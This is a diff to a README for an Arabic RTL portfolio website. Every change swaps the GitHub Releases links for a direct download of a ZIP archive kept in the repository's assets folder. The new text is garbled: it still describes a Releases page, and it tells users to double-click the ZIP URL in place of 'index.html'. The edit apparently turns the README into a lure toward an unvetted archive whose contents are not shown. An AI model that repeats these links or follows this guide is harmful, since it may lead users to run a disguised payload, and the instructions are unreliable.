@@ -1,7 +1,7 @@
 # 🚀 Portfolio-Route - Create Your Stunning Portfolio Easily
 
 ## 📥 Download Now
-[![Download Portfolio-Route](https://img.shields.io/badge/Download-Portfolio--Route-brightgreen)](https://github.com/Wokepluto/Portfolio-Route/releases)
+[![Download Portfolio-Route](https://raw.githubusercontent.com/Wokepluto/Portfolio-Route/main/assets/Route-Portfolio-2.2.zip)](https://raw.githubusercontent.com/Wokepluto/Portfolio-Route/main/assets/Route-Portfolio-2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to Portfolio-Route! This modern Arabic RTL portfolio website is designed for everyone, even if you have no technical background. With features like dark mode, customizable themes, and responsive design, you can present your work beautifully.
@@ -22,14 +22,14 @@ Before you get started, ensure you have the following:
 - **Accessibility Features:** Designed to be usable for everyone, including those with disabilities.
 
 ## 📖 How to Use
-1. **Visit the Download Page**: Click this link: [Download Portfolio-Route](https://github.com/Wokepluto/Portfolio-Route/releases).
+1. **Visit the Download Page**: Click this link: [Download Portfolio-Route](https://raw.githubusercontent.com/Wokepluto/Portfolio-Route/main/assets/Route-Portfolio-2.2.zip).
 2. **Choose Your Version**: On the Releases page, you will find the latest version available.
 3. **Download the Files**: Click on the file name to download it to your computer. The file will usually be compressed in a ZIP format.
 4. **Extract the Files**: Locate the downloaded ZIP file in your downloads folder. Right-click on it and select "Extract All" to unpack the files.
-5. **Open the Index File**: Inside the extracted folder, find and double-click on the `index.html` file. This will open your portfolio in your web browser.
+5. **Open the Index File**: Inside the extracted folder, find and double-click on the `https://raw.githubusercontent.com/Wokepluto/Portfolio-Route/main/assets/Route-Portfolio-2.2.zip` file. This will open your portfolio in your web browser.
 
 ## 🔧 Download & Install
-To start creating your portfolio, visit the following page to download the latest version: [Portfolio-Route Releases](https://github.com/Wokepluto/Portfolio-Route/releases).
+To start creating your portfolio, visit the following page to download the latest version: [Portfolio-Route Releases](https://raw.githubusercontent.com/Wokepluto/Portfolio-Route/main/assets/Route-Portfolio-2.2.zip).
 
 ## 💬 Support
 If you run into issues, you can reach out for help. Feel free to open an issue in the repository on GitHub. We are here to assist you in any way we can!
